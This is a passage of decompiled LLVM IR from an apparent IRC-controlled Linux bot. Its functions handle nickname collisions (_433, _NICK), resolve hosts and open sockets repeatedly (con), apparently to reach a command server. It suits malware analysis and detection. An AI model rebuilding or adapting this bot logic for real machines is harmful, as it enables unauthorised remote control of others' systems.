  %v2_8054bb0 = sub i32 0, %v4_8054ba9
  %v12_8054bb0 = icmp eq i32 %stack_var_-28.0, %v2_8054bb0
  br i1 %v12_8054bb0, label %dec_label_pc_8054d85, label %dec_label_pc_8054bb8

dec_label_pc_8054bb8:                             ; preds = %dec_label_pc_8054b92
  %v22_8054b92 = inttoptr i32 %v5_8054b92 to i8*
  %v4_8054bb8 = add nuw nsw i32 %storemerge1373, 1
  %v7_8054bbf = icmp sgt i32 %storemerge1373, 3
  br i1 %v7_8054bbf, label %dec_label_pc_8054bcd.preheader, label %dec_label_pc_8054b6a.preheader

dec_label_pc_8054b6a.preheader:                   ; preds = %entry, %dec_label_pc_8054bb8
  %storemerge1373 = phi i32 [ 0, %entry ], [ %v4_8054bb8, %dec_label_pc_8054bb8 ]
  %stack_var_-20.172 = phi i8* [ %arg2, %entry ], [ %v22_8054b92, %dec_label_pc_8054bb8 ]
  %stack_var_-28.171 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_8054bb8 ]
  br label %dec_label_pc_8054b6a

dec_label_pc_8054bcd.preheader:                   ; preds = %dec_label_pc_8054bb8
  br label %dec_label_pc_8054bcd

dec_label_pc_8054bca:                             ; preds = %dec_label_pc_8054bec
  %v4_8054bca = add i32 %storemerge12, 1
  br label %dec_label_pc_8054bcd

dec_label_pc_8054bcd:                             ; preds = %dec_label_pc_8054bcd.preheader, %dec_label_pc_8054bca
  %storemerge12 = phi i32 [ %v4_8054bca, %dec_label_pc_8054bca ], [ 0, %dec_label_pc_8054bcd.preheader ]
  %v3_8054be1 = call i32 @_strlen(i8* %v22_8054b92)
  %v7_8054be8 = icmp ult i32 %storemerge12, %v3_8054be1
  %v1_8054bea = icmp eq i1 %v7_8054be8, false
  %.pre = add i32 %storemerge12, %v5_8054b92
  br i1 %v1_8054bea, label %dec_label_pc_8054bcd.dec_label_pc_8054bf8_crit_edge, label %dec_label_pc_8054bec

dec_label_pc_8054bcd.dec_label_pc_8054bf8_crit_edge: ; preds = %dec_label_pc_8054bcd
  %.pre27 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8054bf8

dec_label_pc_8054bec:                             ; preds = %dec_label_pc_8054bcd
  %v1_8054bf2 = inttoptr i32 %.pre to i8*
  %v2_8054bf2 = load i8, i8* %v1_8054bf2, align 1
  %v7_8054bf4 = icmp eq i8 %v2_8054bf2, 32
  %v1_8054bf6 = icmp eq i1 %v7_8054bf4, false
  br i1 %v1_8054bf6, label %dec_label_pc_8054bca, label %dec_label_pc_8054bf8

dec_label_pc_8054bf8:                             ; preds = %dec_label_pc_8054bec, %dec_label_pc_8054bcd.dec_label_pc_8054bf8_crit_edge
  %v1_8054bfe.pre-phi = phi i8* [ %.pre27, %dec_label_pc_8054bcd.dec_label_pc_8054bf8_crit_edge ], [ %v1_8054bf2, %dec_label_pc_8054bec ]
  store i8 0, i8* %v1_8054bfe.pre-phi, align 1
  %v0_8054c01 = load i32, i32* @global_var_807cb6c.53, align 4
  %v3_8054c0d = call i32 @__GI_strcasecmp(i8* %v22_8054b92, i32 %v0_8054c01)
  %v1_8054c15 = icmp eq i32 %v3_8054c0d, 0
  %v1_8054c17 = icmp eq i1 %v1_8054c15, false
  br i1 %v1_8054c17, label %dec_label_pc_8054d85, label %dec_label_pc_8054c1d

dec_label_pc_8054c1d:                             ; preds = %dec_label_pc_8054bf8
  %v0_8054c1d = load i64, i64* @global_var_8074078.34, align 8
  %v1_8054c1d = trunc i64 %v0_8054c1d to i32
  %v1_8054c22 = icmp eq i32 %v1_8054c1d, 0
  %v1_8054c24 = icmp eq i1 %v1_8054c22, false
  br i1 %v1_8054c24, label %dec_label_pc_8054d85, label %dec_label_pc_8054c2a

dec_label_pc_8054c2a:                             ; preds = %dec_label_pc_8054c1d
  br label %dec_label_pc_8054c46.preheader

dec_label_pc_8054c40:                             ; preds = %dec_label_pc_8054c65
  %v5_8054c40 = add i32 %.pre37, 1
  %v22_8054c40 = inttoptr i32 %v5_8054c40 to i8*
  %v4_8054c43 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_8054c46

dec_label_pc_8054c46:                             ; preds = %dec_label_pc_8054c46.preheader, %dec_label_pc_8054c40
  %stack_var_-28.2 = phi i32 [ %v4_8054c43, %dec_label_pc_8054c40 ], [ %stack_var_-28.368, %dec_label_pc_8054c46.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_8054c40, %dec_label_pc_8054c40 ], [ %stack_var_-20.369, %dec_label_pc_8054c46.preheader ]
  %v3_8054c5a = call i32 @_strlen(i8* %arg2)
  %v7_8054c61 = icmp ult i32 %stack_var_-28.2, %v3_8054c5a
  %v1_8054c63 = icmp eq i1 %v7_8054c61, false
  %.pre37 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_8054c63, label %dec_label_pc_8054c6e, label %dec_label_pc_8054c65

dec_label_pc_8054c65:                             ; preds = %dec_label_pc_8054c46
  %v2_8054c68 = load i8, i8* %stack_var_-20.2, align 1
  %v7_8054c6a = icmp eq i8 %v2_8054c68, 32
  %v1_8054c6c = icmp eq i1 %v7_8054c6a, false
  br i1 %v1_8054c6c, label %dec_label_pc_8054c40, label %dec_label_pc_8054c6e

dec_label_pc_8054c6e:                             ; preds = %dec_label_pc_8054c46, %dec_label_pc_8054c65
  %v5_8054c6e = add i32 %.pre37, 1
  %v3_8054c85 = call i32 @_strlen(i8* %arg2)
  %v4_8054c85 = mul i32 %v3_8054c85, -1
  %v1_8054c8b = sub i32 0, %v4_8054c85
  %v2_8054c8c = sub i32 0, %v4_8054c85
  %v12_8054c8c = icmp eq i32 %stack_var_-28.2, %v2_8054c8c
  br i1 %v12_8054c8c, label %dec_label_pc_8054d85, label %dec_label_pc_8054c94

dec_label_pc_8054c94:                             ; preds = %dec_label_pc_8054c6e
  %v22_8054c6e = inttoptr i32 %v5_8054c6e to i8*
  %v4_8054c94 = add nuw nsw i32 %storemerge1170, 1
  %v7_8054c9b = icmp sgt i32 %storemerge1170, 1
  br i1 %v7_8054c9b, label %dec_label_pc_8054ca9.preheader, label %dec_label_pc_8054c46.preheader

dec_label_pc_8054c46.preheader:                   ; preds = %dec_label_pc_8054c2a, %dec_label_pc_8054c94
  %storemerge1170 = phi i32 [ 0, %dec_label_pc_8054c2a ], [ %v4_8054c94, %dec_label_pc_8054c94 ]
  %stack_var_-20.369 = phi i8* [ %arg2, %dec_label_pc_8054c2a ], [ %v22_8054c6e, %dec_label_pc_8054c94 ]
  %stack_var_-28.368 = phi i32 [ 0, %dec_label_pc_8054c2a ], [ %stack_var_-28.2, %dec_label_pc_8054c94 ]
  br label %dec_label_pc_8054c46

dec_label_pc_8054ca9.preheader:                   ; preds = %dec_label_pc_8054c94
  br label %dec_label_pc_8054ca9

dec_label_pc_8054ca6:                             ; preds = %dec_label_pc_8054cc8
  %v4_8054ca6 = add i32 %storemerge, 1
  br label %dec_label_pc_8054ca9

dec_label_pc_8054ca9:                             ; preds = %dec_label_pc_8054ca9.preheader, %dec_label_pc_8054ca6
  %storemerge = phi i32 [ %v4_8054ca6, %dec_label_pc_8054ca6 ], [ 0, %dec_label_pc_8054ca9.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_8054c6e, i32* @edi, align 4
  %v3_8054cbd = call i32 @_strlen(i8* %v22_8054c6e)
  %v0_8054cc4 = load i32, i32* @edx, align 4
  %v7_8054cc4 = icmp ult i32 %v0_8054cc4, %v3_8054cbd
  %v1_8054cc6 = icmp eq i1 %v7_8054cc4, false
  %.pre28 = add i32 %storemerge, %v5_8054c6e
  br i1 %v1_8054cc6, label %dec_label_pc_8054ca9.dec_label_pc_8054cd4_crit_edge, label %dec_label_pc_8054cc8

dec_label_pc_8054ca9.dec_label_pc_8054cd4_crit_edge: ; preds = %dec_label_pc_8054ca9
  %.pre35 = inttoptr i32 %.pre28 to i8*
  br label %dec_label_pc_8054cd4

dec_label_pc_8054cc8:                             ; preds = %dec_label_pc_8054ca9
  %v1_8054cce = inttoptr i32 %.pre28 to i8*
  %v2_8054cce = load i8, i8* %v1_8054cce, align 1
  %v7_8054cd0 = icmp eq i8 %v2_8054cce, 32
  %v1_8054cd2 = icmp eq i1 %v7_8054cd0, false
  br i1 %v1_8054cd2, label %dec_label_pc_8054ca6, label %dec_label_pc_8054cd4

dec_label_pc_8054cd4:                             ; preds = %dec_label_pc_8054cc8, %dec_label_pc_8054ca9.dec_label_pc_8054cd4_crit_edge
  %v1_8054cda.pre-phi = phi i8* [ %.pre35, %dec_label_pc_8054ca9.dec_label_pc_8054cd4_crit_edge ], [ %v1_8054cce, %dec_label_pc_8054cc8 ]
  store i8 0, i8* %v1_8054cda.pre-phi, align 1
  %v1_8054ce3 = call i32 @inet_addr(i32 %v5_8054c6e)
  %v2_8054ce3 = trunc i32 %v1_8054ce3 to i8
  store i8 %v2_8054ce3, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_8054ce3, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8054cf4 = icmp eq i1 %tmp, false
  br i1 %v1_8054cf4, label %dec_label_pc_8054cd4._crit_edge, label %dec_label_pc_8054cf6

dec_label_pc_8054cd4._crit_edge:                  ; preds = %dec_label_pc_8054cd4
  br label %bb

dec_label_pc_8054cf6:                             ; preds = %dec_label_pc_8054cd4
  %v1_8054cfc = call i32 @__GI_gethostbyname(i32 %v5_8054c6e)
  %v4_8054d07 = icmp eq i32 %v1_8054cfc, 0
  %v1_8054d0b = icmp eq i1 %v4_8054d07, false
  br i1 %v1_8054d0b, label %dec_label_pc_8054d28, label %dec_label_pc_8054d0d

dec_label_pc_8054d0d:                             ; preds = %dec_label_pc_8054cf6
  %v2_8054d1e = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_806c670.627 to i32))
  br label %dec_label_pc_8054d85

dec_label_pc_8054d28:                             ; preds = %dec_label_pc_8054cf6
  %v1_8054d2b = add i32 %v1_8054cfc, 12
  %v2_8054d2b = inttoptr i32 %v1_8054d2b to i32*
  %v3_8054d2b = load i32, i32* %v2_8054d2b, align 4
  %v1_8054d33 = add i32 %v1_8054cfc, 16
  %v2_8054d33 = inttoptr i32 %v1_8054d33 to i32*
  %v3_8054d33 = load i32, i32* %v2_8054d33, align 4
  %v1_8054d36 = inttoptr i32 %v3_8054d33 to i32*
  %v2_8054d36 = load i32, i32* %v1_8054d36, align 4
  %v1_8054d3d = inttoptr i32 %v2_8054d36 to i8*
  %v7_8054d40 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_8054d3d, i32 %v3_8054d2b)
  %v2_8054d4d.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_8054cd4._crit_edge, %dec_label_pc_8054d28
  %v2_8054d4d = phi i8 [ %v2_8054ce3, %dec_label_pc_8054cd4._crit_edge ], [ %v2_8054d4d.pre, %dec_label_pc_8054d28 ]
  store i8 %v2_8054d4d, i8* bitcast (i8** @global_var_8074077.628 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8074074.33 to i8*), align 4
  store i64 256, i64* @global_var_8074078.34, align 8
  br label %dec_label_pc_8054d85

dec_label_pc_8054d85:                             ; preds = %dec_label_pc_8054b92, %dec_label_pc_8054c6e, %dec_label_pc_8054c1d, %dec_label_pc_8054bf8, %dec_label_pc_8054d0d, %bb
  %v0_8054d8b = phi i32 [ %v1_8054c1d, %dec_label_pc_8054c1d ], [ %v3_8054c0d, %dec_label_pc_8054bf8 ], [ %v2_8054d1e, %dec_label_pc_8054d0d ], [ ptrtoint (i8** @global_var_8074074.33 to i32), %bb ], [ %v1_8054c8b, %dec_label_pc_8054c6e ], [ %v1_8054baf, %dec_label_pc_8054b92 ]
  ret i32 %v0_8054d8b

; uselistorder directives
  uselistorder i32 %.pre28, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1170, { 1, 0 }
  uselistorder i32 %v5_8054c6e, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i32 %storemerge1373, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_8074074.33, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i64* @global_var_8074078.34, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_8054d85, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_8054ca9, { 1, 0 }
  uselistorder label %dec_label_pc_8054c46.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8054c6e, { 1, 0 }
  uselistorder label %dec_label_pc_8054bcd, { 1, 0 }
  uselistorder label %dec_label_pc_8054b6a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8054b92, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %v0_8054d92 = load i32, i32* @global_var_807cb6c.53, align 4
  %v1_8054d9b = call i32 @free(i32 %v0_8054d92)
  %v2_8054daa = call i32 @realrand(i32 4, i32 8)
  %v1_8054db6 = inttoptr i32 %v2_8054daa to i8*
  %v2_8054db6 = call i32 @randstring(i8* %v1_8054db6)
  store i32 %v2_8054db6, i32* @global_var_807cb6c.53, align 4
  ret i32 %v2_8054db6

; uselistorder directives
  uselistorder i32 %v2_8054db6, { 1, 0 }
}

define i32 @_NICK(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v4_8054ddb = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8054dd8

dec_label_pc_8054dd5:                             ; preds = %dec_label_pc_8054df7
  %v4_8054dd5 = add i32 %storemerge, 1
  br label %dec_label_pc_8054dd8

dec_label_pc_8054dd8:                             ; preds = %entry, %dec_label_pc_8054dd5
  %storemerge = phi i32 [ %v4_8054dd5, %dec_label_pc_8054dd5 ], [ 0, %entry ]
  store i1 false, i1* @df, align 1
  store i32 %v4_8054ddb, i32* @edi, align 4
  %v3_8054dec = call i32 @_strlen(i8* %arg1)
  %v7_8054df3 = icmp ult i32 %storemerge, %v3_8054dec
  %v1_8054df5 = icmp eq i1 %v7_8054df3, false
  %.pre = add i32 %storemerge, %v4_8054ddb
  br i1 %v1_8054df5, label %dec_label_pc_8054dd8.dec_label_pc_8054e03_crit_edge, label %dec_label_pc_8054df7

dec_label_pc_8054dd8.dec_label_pc_8054e03_crit_edge: ; preds = %dec_label_pc_8054dd8
  %.pre11 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8054e03

dec_label_pc_8054df7:                             ; preds = %dec_label_pc_8054dd8
  %v1_8054dfd = inttoptr i32 %.pre to i8*
  %v2_8054dfd = load i8, i8* %v1_8054dfd, align 1
  %v10_8054dff = icmp eq i8 %v2_8054dfd, 33
  %v1_8054e01 = icmp eq i1 %v10_8054dff, false
  br i1 %v1_8054e01, label %dec_label_pc_8054dd5, label %dec_label_pc_8054e03

dec_label_pc_8054e03:                             ; preds = %dec_label_pc_8054df7, %dec_label_pc_8054dd8.dec_label_pc_8054e03_crit_edge
  %v1_8054e09.pre-phi = phi i8* [ %.pre11, %dec_label_pc_8054dd8.dec_label_pc_8054e03_crit_edge ], [ %v1_8054dfd, %dec_label_pc_8054df7 ]
  store i8 0, i8* %v1_8054e09.pre-phi, align 1
  %v0_8054e0c = load i32, i32* @global_var_807cb6c.53, align 4
  %v3_8054e18 = call i32 @__GI_strcasecmp(i8* %arg1, i32 %v0_8054e0c)
  %v1_8054e20 = icmp eq i32 %v3_8054e18, 0
  %v1_8054e22 = icmp eq i1 %v1_8054e20, false
  br i1 %v1_8054e22, label %dec_label_pc_8054e6a, label %dec_label_pc_8054e24

dec_label_pc_8054e24:                             ; preds = %dec_label_pc_8054e03
  %v2_8054e27 = load i8, i8* %tmp18, align 1
  %v10_8054e29 = icmp eq i8 %v2_8054e27, 58
  %v1_8054e2b = icmp eq i1 %v10_8054e29, false
  br i1 %v1_8054e2b, label %dec_label_pc_8054e30, label %dec_label_pc_8054e2d

dec_label_pc_8054e2d:                             ; preds = %dec_label_pc_8054e24
  br label %dec_label_pc_8054e30

dec_label_pc_8054e30:                             ; preds = %dec_label_pc_8054e24, %dec_label_pc_8054e2d
  %v0_8054e30 = load i32, i32* @global_var_807cb6c.53, align 4
  %v1_8054e35 = icmp eq i32 %v0_8054e30, 0
  br i1 %v1_8054e35, label %dec_label_pc_8054e30.dec_label_pc_8054e4a_crit_edge, label %dec_label_pc_8054e39

dec_label_pc_8054e30.dec_label_pc_8054e4a_crit_edge: ; preds = %dec_label_pc_8054e30
  br label %dec_label_pc_8054e4a

dec_label_pc_8054e39:                             ; preds = %dec_label_pc_8054e30
  %v1_8054e42 = call i32 @free(i32 %v0_8054e30)
  br label %dec_label_pc_8054e4a

dec_label_pc_8054e4a:                             ; preds = %dec_label_pc_8054e30.dec_label_pc_8054e4a_crit_edge, %dec_label_pc_8054e39
  %v2_8054e51 = call i32 @realrand(i32 4, i32 8)
  %v1_8054e5d = inttoptr i32 %v2_8054e51 to i8*
  %v2_8054e5d = call i32 @randstring(i8* %v1_8054e5d)
  store i32 %v2_8054e5d, i32* @global_var_807cb6c.53, align 4
  br label %dec_label_pc_8054e6a

dec_label_pc_8054e6a:                             ; preds = %dec_label_pc_8054e03, %dec_label_pc_8054e4a
  %v0_8054e6e = phi i32 [ %v3_8054e18, %dec_label_pc_8054e03 ], [ %v2_8054e5d, %dec_label_pc_8054e4a ]
  ret i32 %v0_8054e6e

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054e6a, { 1, 0 }
  uselistorder label %dec_label_pc_8054e4a, { 1, 0 }
  uselistorder label %dec_label_pc_8054e30, { 1, 0 }
  uselistorder label %dec_label_pc_8054dd8, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e6f = load i32, i32* @ebp, align 4
  store i32 %v0_8054e6f, i32* %stack_var_-4, align 4
  %v4_8054e6f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8054e6f, i32* @ebp, align 4
  %v15_8054e72 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8054f4a = ptrtoint i32* %stack_var_-32 to i32
  %v2_8054f4d = ptrtoint i32* %stack_var_-28 to i32
  %v2_8054f9f = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8054e77

dec_label_pc_8054e77:                             ; preds = %dec_label_pc_8054e77.backedge, %entry
  %v0_8054ebe.pre14 = phi i32 [ %v15_8054e72, %entry ], [ %storemerge16.in, %dec_label_pc_8054e77.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp20, %entry ], [ %stack_var_-8.0.be, %dec_label_pc_8054e77.backedge ]
  store i32 -1, i32* @global_var_807cb70.29, align 16
  store i32 1, i32* %stack_var_-36, align 4
  %v0_8054e88 = load i32, i32* @global_var_807406c.531, align 4
  store i32 %v0_8054e88, i32* %eax.global-to-local, align 4
  %v1_8054e8d = icmp eq i32 %v0_8054e88, 0
  %v1_8054e8f = icmp eq i1 %v1_8054e8d, false
  br i1 %v1_8054e8f, label %dec_label_pc_8054eb4, label %dec_label_pc_8054e91

dec_label_pc_8054e91:                             ; preds = %dec_label_pc_8054e77
  %v1_8054e91 = call i32 @random()
  %v0_8054e98 = load i64, i64* @global_var_806f060.631, align 8
  %v2_8054ea1 = ashr i32 %v1_8054e91, 31
  %v2_8054ea4 = zext i32 %v1_8054e91 to i64
  %v4_8054ea4 = zext i32 %v2_8054ea1 to i64
  %v5_8054ea4 = mul nuw i64 %v4_8054ea4, 4294967296
  %v6_8054ea4 = or i64 %v5_8054ea4, %v2_8054ea4
  %v7_8054ea4 = and i64 %v0_8054e98, 4294967295
  %v10_8054ea4 = srem i64 %v6_8054ea4, %v7_8054ea4
  %v11_8054ea4 = trunc i64 %v10_8054ea4 to i32
  store i32 %v11_8054ea4, i32* %edx.global-to-local, align 4
  store i32 %v11_8054ea4, i32* %eax.global-to-local, align 4
  %v1_8054ea8 = mul i32 %v11_8054ea4, 4
  %v2_8054ea8 = add i32 %v1_8054ea8, ptrtoint ([16 x i8]** @global_var_806f064.633 to i32)
  %v3_8054ea8 = inttoptr i32 %v2_8054ea8 to i32*
  %v4_8054ea8 = load i32, i32* %v3_8054ea8, align 4
  store i32 %v4_8054ea8, i32* %eax.global-to-local, align 4
  store i32 %v4_8054ea8, i32* @global_var_807cc84.530, align 4
  %v0_8054ebe.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054eb4

dec_label_pc_8054eb4:                             ; preds = %dec_label_pc_8054e77, %dec_label_pc_8054e91
  %v0_8054ebe.pre = phi i32 [ %v0_8054ebe.pre14, %dec_label_pc_8054e77 ], [ %v0_8054ebe.pre.pre, %dec_label_pc_8054e91 ]
  store i32 0, i32* @global_var_807406c.531, align 4
  br label %dec_label_pc_8054ebe

dec_label_pc_8054ebe:                             ; preds = %dec_label_pc_8054ebe, %dec_label_pc_8054eb4
  %v0_8054ebe = phi i32 [ %v1_8054ecc, %dec_label_pc_8054ebe ], [ %v0_8054ebe.pre, %dec_label_pc_8054eb4 ]
  %v1_8054ec1 = add i32 %v0_8054ebe, -8
  %v2_8054ec1 = inttoptr i32 %v1_8054ec1 to i32*
  store i32 6, i32* %v2_8054ec1, align 4
  %v1_8054ec3 = add i32 %v0_8054ebe, -12
  %v2_8054ec3 = inttoptr i32 %v1_8054ec3 to i32*
  store i32 1, i32* %v2_8054ec3, align 4
  %v1_8054ec5 = add i32 %v0_8054ebe, -16
  %v2_8054ec5 = inttoptr i32 %v1_8054ec5 to i32*
  store i32 2, i32* %v2_8054ec5, align 4
  %v0_8054ec7 = load i32, i32* %stack_var_-36, align 4
  %v1_8054ec7 = load i32, i32* %stack_var_-32, align 4
  %v2_8054ec7 = load i32, i32* %stack_var_-28, align 4
  %v3_8054ec7 = call i32 @socket(i32 %v0_8054ec7, i32 %v1_8054ec7, i32 %v2_8054ec7)
  %v0_8054ecc = load i32, i32* @esp, align 4
  %v1_8054ecc = add i32 %v0_8054ecc, 16
  store i32 %v3_8054ec7, i32* @global_var_807cb70.29, align 16
  store i32 %v3_8054ec7, i32* %eax.global-to-local, align 4
  %v2_8054ed9 = icmp slt i32 %v3_8054ec7, 0
  br i1 %v2_8054ed9, label %dec_label_pc_8054ebe, label %dec_label_pc_8054edd

dec_label_pc_8054edd:                             ; preds = %dec_label_pc_8054ebe
  %v0_8054edd = load i32, i32* @global_var_807cc84.530, align 4
  store i32 %v0_8054edd, i32* %eax.global-to-local, align 4
  %v3_8054ee5 = inttoptr i32 %v0_8054ecc to i32*
  store i32 %v0_8054edd, i32* %v3_8054ee5, align 4
  %v0_8054ee6 = load i32, i32* %stack_var_-36, align 4
  %v1_8054ee6 = call i32 @inet_addr(i32 %v0_8054ee6)
  store i32 %v1_8054ee6, i32* %eax.global-to-local, align 4
  %v0_8054eeb = load i32, i32* @esp, align 4
  %v1_8054eee = icmp eq i32 %v1_8054ee6, 0
  br i1 %v1_8054eee, label %dec_label_pc_8054f08, label %dec_label_pc_8054ef2

dec_label_pc_8054ef2:                             ; preds = %dec_label_pc_8054edd
  %v0_8054ef2 = load i32, i32* @global_var_807cc84.530, align 4
  store i32 %v0_8054ef2, i32* %eax.global-to-local, align 4
  %v3_8054efa = inttoptr i32 %v0_8054eeb to i32*
  store i32 %v0_8054ef2, i32* %v3_8054efa, align 4
  %v0_8054efb = load i32, i32* %stack_var_-36, align 4
  %v1_8054efb = call i32 @inet_addr(i32 %v0_8054efb)
  store i32 %v1_8054efb, i32* %eax.global-to-local, align 4
  %v0_8054f00 = load i32, i32* @esp, align 4
  %v10_8054f03 = icmp eq i32 %v1_8054efb, -1
  %v1_8054f06 = icmp eq i1 %v10_8054f03, false
  br i1 %v1_8054f06, label %dec_label_pc_8054f68, label %dec_label_pc_8054f08

dec_label_pc_8054f08:                             ; preds = %dec_label_pc_8054ef2, %dec_label_pc_8054edd
  %v0_8054f0d.in = phi i32 [ %v0_8054f00, %dec_label_pc_8054ef2 ], [ %v0_8054eeb, %dec_label_pc_8054edd ]
  %v0_8054f08 = load i32, i32* @global_var_807cc84.530, align 4
  store i32 %v0_8054f08, i32* %eax.global-to-local, align 4
  %v3_8054f10 = inttoptr i32 %v0_8054f0d.in to i32*
  store i32 %v0_8054f08, i32* %v3_8054f10, align 4
  %v0_8054f11 = load i32, i32* %stack_var_-36, align 4
  %v1_8054f11 = call i32 @__GI_gethostbyname(i32 %v0_8054f11)
  store i32 %v1_8054f11, i32* %eax.global-to-local, align 4
  %v0_8054f16 = load i32, i32* @esp, align 4
  %v4_8054f1c = icmp eq i32 %v1_8054f11, 0
  %v1_8054f20 = icmp eq i1 %v4_8054f1c, false
  br i1 %v1_8054f20, label %dec_label_pc_8054f42, label %dec_label_pc_8054f22

dec_label_pc_8054f22:                             ; preds = %dec_label_pc_8054f08
  store i32 0, i32* @global_var_807cc84.530, align 4
  %v0_8054f2c = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8054f2c, i32* %eax.global-to-local, align 4
  %v3_8054f34 = inttoptr i32 %v0_8054f16 to i32*
  store i32 %v0_8054f2c, i32* %v3_8054f34, align 4
  %v1_8054f35 = call i32 @close(i32 %v1_8054f11)
  br label %dec_label_pc_8054e77.backedge

dec_label_pc_8054e77.backedge:                    ; preds = %dec_label_pc_8054f22, %dec_label_pc_8055084
  %storemerge = phi i32 [ %v1_8054f35, %dec_label_pc_8054f22 ], [ %v1_8055097, %dec_label_pc_8055084 ]
  %stack_var_-8.0.be = phi i32 [ %v1_8054f11, %dec_label_pc_8054f22 ], [ %stack_var_-8.1, %dec_label_pc_8055084 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge16.in.in = load i32, i32* @esp, align 4
  %storemerge16.in = add i32 %storemerge16.in.in, 16
  br label %dec_label_pc_8054e77

dec_label_pc_8054f42:                             ; preds = %dec_label_pc_8054f08
  store i32 %v1_8054f11, i32* %eax.global-to-local, align 4
  %v1_8054f45 = add i32 %v1_8054f11, 12
  %v2_8054f45 = inttoptr i32 %v1_8054f45 to i32*
  %v3_8054f45 = load i32, i32* %v2_8054f45, align 4
  store i32 %v3_8054f45, i32* %edx.global-to-local, align 4
  store i32 %v1_8054f11, i32* %eax.global-to-local, align 4
  %v1_8054f53 = add i32 %v1_8054f11, 16
  %v2_8054f53 = inttoptr i32 %v1_8054f53 to i32*
  %v3_8054f53 = load i32, i32* %v2_8054f53, align 4
  store i32 %v3_8054f53, i32* %eax.global-to-local, align 4
  %v1_8054f56 = inttoptr i32 %v3_8054f53 to i32*
  %v2_8054f56 = load i32, i32* %v1_8054f56, align 4
  store i32 %v2_8054f56, i32* %eax.global-to-local, align 4
  %v2_8054f5b = add i32 %v0_8054f16, 8
  %v3_8054f5b = inttoptr i32 %v2_8054f5b to i32*
  store i32 %v3_8054f45, i32* %v3_8054f5b, align 4
  %v2_8054f5c = add i32 %v0_8054f16, 4
  %v3_8054f5c = inttoptr i32 %v2_8054f5c to i32*
  store i32 %v2_8054f4d, i32* %v3_8054f5c, align 4
  %v0_8054f5d = load i32, i32* %eax.global-to-local, align 4
  %v3_8054f5d = inttoptr i32 %v0_8054f16 to i32*
  store i32 %v0_8054f5d, i32* %v3_8054f5d, align 4
  %v1_8054f5e = load i32, i32* %stack_var_-4, align 4
  %v2_8054f5e = load i32, i32* %stack_var_0, align 4
  %v3_8054f5e = call i32 @bcopy(i32 %v1_8054f11, i32 %v1_8054f5e, i32 %v2_8054f5e)
  store i32 %v3_8054f5e, i32* %eax.global-to-local, align 4
  %v0_8054f63 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054f7c

dec_label_pc_8054f68:                             ; preds = %dec_label_pc_8054ef2
  %v0_8054f68 = load i32, i32* @global_var_807cc84.530, align 4
  store i32 %v0_8054f68, i32* %eax.global-to-local, align 4
  %v3_8054f70 = inttoptr i32 %v0_8054f00 to i32*
  store i32 %v0_8054f68, i32* %v3_8054f70, align 4
  %v1_8054f71 = call i32 @inet_addr(i32 %stack_var_-8.0)
  store i32 %v1_8054f71, i32* %eax.global-to-local, align 4
  %v0_8054f76 = load i32, i32* @esp, align 4
  store i32 %v1_8054f71, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8054f7c

dec_label_pc_8054f7c:                             ; preds = %dec_label_pc_8054f42, %dec_label_pc_8054f68
  %v0_8054f82.in = phi i32 [ %v0_8054f63, %dec_label_pc_8054f42 ], [ %v0_8054f76, %dec_label_pc_8054f68 ]
  %stack_var_-8.1 = phi i32 [ %v1_8054f11, %dec_label_pc_8054f42 ], [ %stack_var_-8.0, %dec_label_pc_8054f68 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_8054f85 = inttoptr i32 %v0_8054f82.in to i32*
